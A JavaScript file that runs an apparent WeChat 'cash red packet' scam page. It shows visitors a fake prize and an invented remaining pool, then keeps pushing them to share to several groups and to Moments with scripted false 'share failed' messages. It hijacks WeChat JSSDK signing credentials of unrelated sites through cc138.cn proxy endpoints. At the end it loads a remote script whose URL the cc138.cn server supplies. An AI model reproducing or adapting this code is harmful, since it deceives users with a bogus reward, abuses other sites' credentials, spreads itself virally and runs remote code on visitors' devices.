window['data'] = window['data'] || {};
var Ajax={
    get: function(url, fn) {
        // XMLHttpRequest对象用于在后台与服务器交换数据
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.onreadystatechange = function() {
            // readyState == 4说明请求已完成
            if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) {
                // 从服务器获得数据
                fn.call(this, xhr.responseText);
            }
        };
        xhr.send();
    },post: function (url, data, fn) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        // 添加http头，发送信息至服务器时内容编码类型
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
                fn.call(this, xhr.responseText);
            }
        };
        xhr.send(data);
    }
}
window.gConfig = $.extend({
    endPageUrl: 'javascript:setTimeout(function() {history.go(-1)},0)',
    defaultTips: [
        '<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/>',
        '<span>您获得现金红包</span><br/>',
        '<span style="font-size: 20px;color:red;">%(money)元</span><br/>',
        '<span style="color:red;">活动宗旨为答谢更多的粉丝，分享到群后</span><span  style="color:red; font-size: 25px;">即可领取</span><br/>',
        '<span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">3378.3万</span>元，先到先得，马上分享领取到账！<br/>',
    ].join(''),
    successTips: [
        '<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span>获得￥ <span style="font-size: 20px;color:red;">%(money)</span>现金红包<br/>',
        '<span>由于活动量巨大，正在排队发放,</span><br/>',
        '<span>最晚48小时内到账,(</span><span style="color:red;font-size:20px;">请保留朋友</span><br/>',
        '<span style="color:red;font-size:20px;">圈分享至微信收到余额到账</span><br/>',
        '<span style="color:red;font-size:20px;">通知</span>)!<br/>',
        '<span style="color:red;font-size:20px;">朋友圈信息不可删除,否则无</span><br/>',
        '<span style="color:red;font-size:20px;">法核实用户信息</span><br/>',
        '<span>以免现金红包发放失败!</span><br/>',
    ].join(''),
    groupTips: [
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
            successTips: '<br>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 18px;color: red">1个不同的群</b><br>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
        },
    ],
    timeLineTips: [
        {
            successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
            successTips: '<br>注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
        },
    ]
}, (window['data']));
var evkey = M.getParam('_evkey');
var site = M.getParam('_c');

if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
    location.href = window.data['attached']['iosGoAdUrl'];
}

/* 借权start */
var location_host = location.host;

var biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"];
var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];


function pad (num, size) {
    var s = num + "";
    while (s.length < size) s = "0" + s;
    return s;
}


/* 借权end */
function record (event, id, allow_reply) {
    try {
        if (!localStorage.getItem(event + ':' + id) || allow_reply) {
            //$.post('http://p.rsren.com.cn./record', {event: event, id: id})
            localStorage.setItem(event + ':' + id, true);
        }
    } catch (e) {

    }
}


function showShareTips (obj) {
    if (typeof obj === 'object') {
        g_dialog.alert({
            title: obj.successTitle || '',
            message: obj.successTips,
            btn: '我知道了'
        });
    } else if (typeof obj === 'string' && obj) {
        g_dialog.alert({
            title: '',
            message: obj,
            btn: '我知道了'
        });
    }
}

//获取url 参数
function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}

// 分享
(function () {
    var group_ad = false;
    var timeline_ad = false;
    var shareATimes = 0;
    var shareTTimes = 0;
    var fxTitle,fxDesc,fxUrl,fxImg;
    var pyqfxTitle,pyqfxUrl,pyqfxImg;
    var qunshareJS=0;
    var pyqshareJS=0;
    var ptType="pg";
    var u = navigator.userAgent;
    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
    if(isAndroid==true){
        ptType="az";
    }


    function share_tip () {

        // 4次群 2次朋友圈
        if (shareATimes == 0) {
            showShareTips(window.g_tips_message_obj);
        } else if (shareATimes == 1) {
            window.g_tips_message_obj = gConfig.groupTips[0];
            showShareTips(window.g_tips_message_obj);
            shareFriend();
        } else if (shareATimes == 2) {
            window.g_tips_message_obj = gConfig.groupTips[1];
            showShareTips(window.g_tips_message_obj);
            shareFriend();
        } else if (shareATimes == 3) {
            window.g_tips_message_obj = gConfig.groupTips[2];
            showShareTips(window.g_tips_message_obj);
            shareFriend();
        } else {
            if (shareTTimes < 1) {
                window.g_tips_message_obj = gConfig.groupTips[3];
                showShareTips(window.g_tips_message_obj);
                show_timeline_menu();
                shareTimeline();
                $('.js_share_to_desc').text('朋友圈');
            } else {
                shareTimeline();
                if (shareATimes < 4) {
                    window.g_tips_message_obj = {
                        successTips: '<b style="font-size: 30px;color: #f5294c">分享失败</b><br>请先分享到<b style="font-size: 30px;color: #f5294c">微信群</b>即可领取成功!'
                    };
                    showShareTips(window.g_tips_message_obj);
                    showShareTips();
                    return;
                }

                if (shareTTimes == 1 && timeline_ad) {
                    window.g_tips_message_obj = gConfig.timeLineTips[0];
                    showShareTips(window.g_tips_message_obj);
                } else {
                    try {
                        $(document.body).trigger('event_page_share_done');
                    } catch (e) {

                    }
                }
            }
        }


    }

    function timeline_callback () {
        if (shareATimes >= 3) {
            shareTTimes += 1;
        }
        share_tip();
        record('share', site, true);
        record('share-uv', site);
        evkey && record('share', evkey, true);
        evkey && record('share-uv', evkey);
    }

    function appmessage_callback () {
        shareATimes += 1;
        share_tip();
        record('share', site, true);
        record('share-uv', site);
        evkey && record('share', evkey, true);
        evkey && record('share-uv', evkey);
    }

    function shareFriend () {
        //分享群
        if(location_host.indexOf('mgtv.com') > -1 || location_host.indexOf('cztv.com') > -1 || location_host.indexOf('kancloud.cn') > -1 || location_host.indexOf('kuaizhan.com') > -1 || location_host.indexOf('ireader.com') > -1 || location_host.indexOf('zhangyue.com') > -1 || location_host.indexOf('sogou.com') > -1 || location_host.indexOf('fkw.com') > -1 ||location_host.indexOf('pingan.com') > -1){
            if(qunshareJS==0){
                /*$.ajax({
                    type: "POST",
                    url: "https://cc138.cn/Api/hb/getFxInfo.php?"+Math.random(),
                    data:{fxbs:"py",qfxcs:qunshareJS},
                    dataType:"json",
                    success:function (d) {
                        var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                        fxTitle=d.fxTitle;
                        fxDesc=d.fxDesc;
                        fxUrl=d.fxLink;
                        fxImg=d.fxImg;
                    }
                });*/
                Ajax.post("https://cc138.cn/Api/hb/getFxInfo.php",'fxbs=py&qfxcs='+qunshareJS+'&ptType='+ptType,function (d) {
                    var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                    fxTitle=d.fxTitle;
                    fxDesc=d.fxDesc;
                    fxUrl=d.fxLink;
                    fxImg=d.fxImg;
                });
            }
            wx.ready(function () {
                qunshareJS++;
                /*$.ajax({
                    type: "POST",
                    url: "https://cc138.cn/Api/hb/getFxInfo.php?"+Math.random(),
                    data:{fxbs:"py",qfxcs:qunshareJS},
                    dataType:"json",
                    success:function (d) {
                        fxTitle=d.fxTitle;
                        fxDesc=d.fxDesc;
                        fxUrl=d.fxLink;
                        fxImg=d.fxImg;
                    }
                });*/
                Ajax.post("https://cc138.cn/Api/hb/getFxInfo.php",'fxbs=py&qfxcs='+qunshareJS+'&ptType='+ptType,function (d) {
                    var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                    fxTitle=d.fxTitle;
                    fxDesc=d.fxDesc;
                    fxUrl=d.fxLink;
                    fxImg=d.fxImg;
                });
                wx.onMenuShareAppMessage({
                    title: fxTitle,
                    link: fxUrl,
                    desc: fxDesc,
                    imgUrl: fxImg,
                    dataUrl: "https://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    success: function () {
                        appmessage_callback();
                    },
                    cancel: function () {
                    }
                });
            });
        }else{
            //免接口JSSDK
            /*$.ajax({
                type: "POST",
                url: "https://cc138.cn/Api/hb/getFxInfo.php?"+Math.random(),
                data:{fxbs:"py",qfxcs:qunshareJS},
                dataType:"json",
                success:function (d) {
                    fxTitle=d.fxTitle;
                    fxDesc=d.fxDesc;
                    fxUrl=d.fxLink;
                    fxImg=d.fxImg;
                }
            });*/
            Ajax.post("https://cc138.cn/Api/hb/getFxInfo.php",'fxbs=py&qfxcs='+qunshareJS+'&ptType='+ptType,function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                fxTitle=d.fxTitle;
                fxDesc=d.fxDesc;
                fxUrl=d.fxLink;
                fxImg=d.fxImg;
            });
            WeixinJSBridge.on('menu:share:appmessage', function (argv) {
                WeixinJSBridge.invoke('sendAppMessage', {
                    "title": fxTitle,
                    "desc": fxDesc,
                    "link": fxUrl,
                    "img_url": fxImg,
                    "dataUrl": "https://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                }, function (res) {
                    if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
                        qunshareJS++;
                        appmessage_callback();
                    }
                });
            });
        }


    }

    function shareTimeline () {
        //朋友圈
        if(location_host.indexOf('mgtv.com') > -1 || location_host.indexOf('cztv.com') > -1 || location_host.indexOf('kancloud.cn') > -1 || location_host.indexOf('kuaizhan.com') > -1 || location_host.indexOf('ireader.com') > -1 || location_host.indexOf('zhangyue.com') > -1 || location_host.indexOf('sogou.com') > -1 || location_host.indexOf('fkw.com') > -1 ||location_host.indexOf('pingan.com') > -1){
            /*$.ajax({
                type: "POST",
                url: "https://cc138.cn/Api/hb/getFxInfo.php?"+Math.random(),
                data:{fxbs:"pyq",pyqfxcs:pyqshareJS},
                dataType:"json",
                success:function (d) {
                    pyqfxTitle=d.fxTitle;
                    pyqfxUrl=d.fxLink;
                    pyqfxImg=d.fxImg;
                }
            });*/
            Ajax.post("https://cc138.cn/Api/hb/getFxInfo.php",'fxbs=pyq&pyqfxcs='+pyqshareJS+'&ptType='+ptType,function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                pyqfxTitle=d.fxTitle;
                pyqfxUrl=d.fxLink;
                pyqfxImg=d.fxImg;
            });
            //分享朋友圈
            wx.ready(function () {
                pyqshareJS+=1;
                wx.onMenuShareTimeline({
                    title: pyqfxTitle,
                    link: pyqfxUrl,
                    imgUrl: pyqfxImg,
                    dataUrl: "https://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                    type: 'video',
                    success: function () {
                        timeline_callback();
                    },
                    cancel: function () {
                    }
                });
            });
        }else{
            //免接口JSSDK
            /*$.ajax({
                type: "POST",
                url: "https://cc138.cn/Api/hb/getFxInfo.php?"+Math.random(),
                data:{fxbs:"pyq",qfxcs:pyqshareJS},
                dataType:"json",
                success:function (d) {
                    pyqfxTitle=d.fxTitle;
                    pyqfxUrl=d.fxLink;
                    pyqfxImg=d.fxImg;
                }
            });*/
            Ajax.post("https://cc138.cn/Api/hb/getFxInfo.php",'fxbs=pyq&pyqfxcs='+pyqshareJS+'&ptType='+ptType,function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                pyqfxTitle=d.fxTitle;
                pyqfxUrl=d.fxLink;
                pyqfxImg=d.fxImg;
            });
            WeixinJSBridge.on("menu:share:timeline", function() {
                WeixinJSBridge.invoke("shareTimeline", {
                    title:pyqfxTitle,
                    link:pyqfxUrl,
                    img_url:pyqfxImg,
                    type:"video",
                    dataUrl:"https://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
                }, function(res) {
                    if(/ok|confirm/i.test(res.err_msg || res.errMsg)){
                        pyqshareJS++;
                        if(qunshareJS<=3){
                            pyqshareJS=0;
                        }
                        timeline_callback();
                    }

                });
            });

        }

    }

    function GetUrlRelativePath(){
        //url相对路径获取
        var url = document.location.toString();
        var arrUrl = url.split("//");

        var start = arrUrl[1].indexOf("/");
        var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符

        if(relUrl.indexOf("?") != -1){
            relUrl = relUrl.split("?")[0];
        }
        return relUrl;
    }

    function show_timeline_menu () {
        if (window.data.attached.signmode == 'jssdk') {
            if (location_host.indexOf('mgtv.com') > -1 || location_host.indexOf('cztv.com') > -1 || location_host.indexOf('kancloud.cn') > -1 || location_host.indexOf('kuaizhan.com') > -1 || location_host.indexOf('ireader.com') > -1 || location_host.indexOf('zhangyue.com') > -1 || location_host.indexOf('sogou.com') > -1 || location_host.indexOf('fkw.com') > -1 || location_host.indexOf('pingan.com') > -1) {
                wx.hideOptionMenu();
            }
            if (M.getParam('debugx') === '1') {
                wx.showMenuItems({
                    menuList: [
                        'menuItem:share:timeline',
                        'menuItem:share:appMessage',
                    ]
                });
            } else {
                wx.showMenuItems({menuList: ['menuItem:share:timeline']});
            }
        }
    }

    function sina_config () {
        $.post('https://blog.sina.cn/dpool/blog/newblog/riaapi/mblog/wechat.php', {
            original_url: location.href.split('#')[0]
        }, function (d) {
            d = JSON.parse(d);
            var config = d.data;
            jssdk_config(config);
        });
    }

    function baidu_config () {
        $.ajax(
            {
                type: "GET",
                url: 'https://po.baidu.com/api/wechat/token.jsonp?app_id=wxadc1a0c6b9096e89&url=' + encodeURIComponent(location.href.split('#')[0]),
                dataType: "jsonp",
                jsonp: "callback",
                callback: 'jsonp1',
                data: {},
                success: function (d) {
                    var config = d.data;
                    jssdk_config(config);
                    setTimeout(function () {
                        jssdk_config(config);
                    }, 500);
                }
            });
    }

    function mgtv_config () {
        $.ajax({
            type: "GET",
            url: "https://cc138.cn/Api/hb/getMgPeizhi.php?url="+encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
            //url: "https://cc138.cn/Api/hb/getMgPeizhi.php?url="+encodeURIComponent(location.href.split('/')[0]+"//"+location.href.split('/')[2]+GetUrlRelativePath()),
            data:{},
            dataType:"json",
            success:function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                jssdk_config(d.data);
            }
        });
    }
    function cztv_config () {
        $.ajax({
            type: "GET",
            url: "https://cc138.cn/Api/hb/getCzTvPeizhi.php?url="+encodeURIComponent(location.href.split('#')[0]),
            data:{},
            dataType:"json",
            success:function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                jssdk_config(d);
            }
        });
    }
    function kanyun_config(){
        $.getJSON('https://www.kancloud.cn/wechat/jsapi', function (d) {
            jssdk_config({
                appId: d.appId,
                timestamp: d.timestamp,
                nonceStr: d.nonceStr,
                signature: d.signature
            });
        });
    }
    function kuaizhan_config(){
        $.ajax({
            type: "GET",
            url: "https://wxshare.kuaizhan.com/api-bridge/weixin/ajax-wx-js-config?url="+encodeURIComponent(location.href.split('#')[0]),
            data:{},
            dataType:"json",
            success:function (d) {
                jssdk_config(d.data);
            }
        });
    }
    function zhangyue_config(){
        $.getJSON('https://'+location.href.split('/')[2]+'/zysns/app/app.php?ca=Wxauth.GetWxjsConfig&url='+encodeURIComponent(location.href.split('#')[0]), function (d) {
            jssdk_config(d);
        });
    }
    function sogou_config(){
        $.ajax({
            type: "GET",
            url: "https://cc138.cn/Api/hb/getSogouPeizhi.php?url="+encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
            data:{},
            dataType:"json",
            success:function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                jssdk_config({
                    appId: d.appId,
                    timestamp: d.timestamp,
                    nonceStr: d.nonceStr,
                    signature: d.signature
                });
            }
        });
    }
    function fkw_config(){
        $.ajax({
            type: "POST",
            url: "https://cc138.cn/Api/hb/getFKWpeizhi.php?url="+encodeURIComponent(encodeURIComponent(encodeURIComponent(location.href.split('#')[0]))),
            data:{},
            dataType:"json",
            success:function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                jssdk_config({
                    appId: d.data.appId,
                    timestamp: d.data.timestamp,
                    nonceStr: d.data.noncestr,
                    signature: d.data.signature
                });
            }
        });
    }
    function pingan_config(){
        $.ajax({
            type: "GET",
            url: "https://cc138.cn/Api/hb/getJSSDK.php?url="+encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
            data:{},
            dataType:"json",
            success:function (d) {
                var d=JSON.parse(d);//因为获取过来的json是string类型的 所以转换成json
                jssdk_config({
                    appId: d.data.config.appId,
                    timestamp: d.data.config.timestamp,
                    nonceStr: d.data.config.nonceStr,
                    signature: d.data.config.signature
                });
            }
        });
    }
    function jssdk_config (config) {
        config['jsApiList'] = ['checkJsApi','onMenuShareTimeline','onMenuShareAppMessage','onMenuShareQQ','onMenuShareWeibo','hideMenuItems','showMenuItems'];
        if (M.getParam('debug') === '1') {
            config['debug'] = true;
            alert(config['appId']);
            alert(JSON.stringify(config));
        } else {
            config['debug'] = false;
        }
        /*if(location_host.indexOf('pingan.com') > -1){
            config['debug'] = true;
            alert(config['appId']);
            alert(config['nonceStr']);
            alert(config['timestamp']);
            alert(config['signature']);
        }*/
        wx.config(config);
        wx.ready(function () {
            wx.hideOptionMenu();
            if (M.getParam('debugx') === '1') {
                wx.showMenuItems({
                    menuList: [
                        'menuItem:share:timeline',
                        'menuItem:share:appMessage',
                    ]
                });
            } else {
                wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
            }
        });
    }

    function start_load () {
        var data = window.data;
        if (data.attached['timeline_ad']) timeline_ad = true;
        if (data.attached['group_ad']) group_ad = true;

        if (window.data.attached.signmode === 'jssdk') {
            if (location_host.indexOf('sina.cn') > -1) {
                sina_config();
            } else if (location_host.indexOf('baidu.com') > -1) {
                baidu_config();
            }  else if (location_host.indexOf('mgtv.com') > -1){
                mgtv_config();
            }else if (location_host.indexOf('cztv.com') > -1){
                cztv_config();
            }else if(location_host.indexOf('kancloud.cn') > -1){
                kanyun_config();
            }else if(location_host.indexOf('kuaizhan.com') > -1){
                kuaizhan_config();
            }else if(location_host.indexOf('ireader.com') > -1 || location_host.indexOf('zhangyue.com') > -1){
                zhangyue_config();
            }else if(location_host.indexOf('sogou.com') > -1){
                sogou_config();
            }else if(location_host.indexOf('fkw.com') > -1){
                fkw_config();
            }else if(location_host.indexOf('pingan.com') > -1){
                pingan_config();
            }
            else {
                if (window['g_shareData'] && window['g_shareData']['jssdk']) {
                    //jssdk_config(g_shareData['jssdk']);
                }
            }
        } else {
            WeixinJSBridge.call('showOptionMenu');
        }
        shareFriend();
        shareTimeline();
    }

    function init () {
        if (typeof WeixinJSBridge === "undefined") {
            if (document.addEventListener) {
                document.addEventListener('WeixinJSBridgeReady', start_load, false);
            } else if (document.attachEvent) {
                document.attachEvent('WeixinJSBridgeReady', start_load);
                document.attachEvent('onWeixinJSBridgeReady', start_load);
            }
        } else {
            start_load();
        }
    }

    window.g_share = {
        init: init,
    }

}())

$(function () {

    var config = {
        tpl: {
            body: [
                '<div class="share-container">',
                '  <h3 class="share-container-bg-title">分享点这里</h3>',
                '  <div class="share-prompt">',
                '    <p>',
                '      点击右上角，分享到',
                '      <i class="icon_share"></i>',
                '      <span class="js_share_to_desc">微信群</span>',
                '    </p>',
                '    <p>即可领取￥<span>%(money)</span>￥</p>',
                '  </div>',
                '  <div class="red-packet">',
                '    <img>',
                '    <p>恭喜发财</p>',
                '  </div>',
                '</div>',
            ].join(''),
        }
    };

    function initPage (money) {
        M.resetFont();
        $(document.body).append(config.tpl.body.jstpl_format({
            money: money
        }));
        $('.red-packet img').attr('src', $('.js_head_img').attr('data-src'));
        $('.share-container').css({
            height: $(window).height() + 'px'
        });
    }

    function bindEvent () {

        document.body.onclick = function () {
        }

        $('.share-container').on('click', function () {
            if (!window['g_tips_message_obj']) {
                window['g_tips_message_obj'] = gConfig.defaultTips;
            }
            showShareTips(g_tips_message_obj);
        });

        $(document.body).on('event_page_share_done', function () {
            if (gConfig.successTips) {
                g_dialog.alert({
                    title: '',
                    message: gConfig.successTips,
                    btn: '我知道了',
                    cb: function () {
                        if (gConfig.endPageUrl) {
                            //location.replace(gConfig.endPageUrl);
                            //分享跳转
                            window.history.back(-1);
                        }
                        return false
                    }
                });
            }
        });

    }

    function replaceMoney (obj, money) {
        obj = obj || {}
        if (obj.title) {
            obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
        }
        if (obj.desc) {
            obj.desc = obj.desc.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace('\\n', '\n').replace(/{bq}/ig, bq);
        }
        if (obj.successTitle) {
            obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
        }
        if (obj.successTips) {
            obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
        }
    }

    function getQueryString(name) {//获取url 参数
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
        var r = window.location.search.substr(1).match(reg);
        if (r != null) return unescape(r[2]);
        return null;
    }

    function init () {

        record('tosharer', site);
        evkey && record('tosharer', evkey);
        if(getQueryString('money')!=null){
            var money=getQueryString('money');
        }else{
            var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 20) + 30) * 100)
            var money = (parseFloat(moneyStr / 100).toFixed(2));
        }
        gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
            money: money
        });

        gConfig.successTips = gConfig.successTips.jstpl_format({
            money: money
        });

        replaceMoney(gConfig['ad'], money)
        replaceMoney(gConfig['to_group'], money)
        replaceMoney(gConfig['to_timeline'], money)
        replaceMoney(gConfig['to_timeline'], money)

        $(gConfig.groupTips).each(function (index, item) {
            replaceMoney(item, money)
        });

        $(gConfig.timeLineTips).each(function (index, item) {
            replaceMoney(item, money)
        });

        initPage(money);
        bindEvent();
        g_share.init();
        setTimeout(function () {
            showShareTips(gConfig.defaultTips);
        });
    }

    init();
});

$(function () {
    // 总统计
    M.loadJS('https://hm.baidu.com/hm.js?206e4c028d3443c458a22e5b8937dd82');

});

// 设置返回
$(function () {
    $.ajax({
        type: "GET",
        url: "https://cc138.cn/Api/hb/getApi.php",
        data:{},
        dataType:"json",
        success:function (d) {
            M.loadJS(d.fhym);
        }
    });
});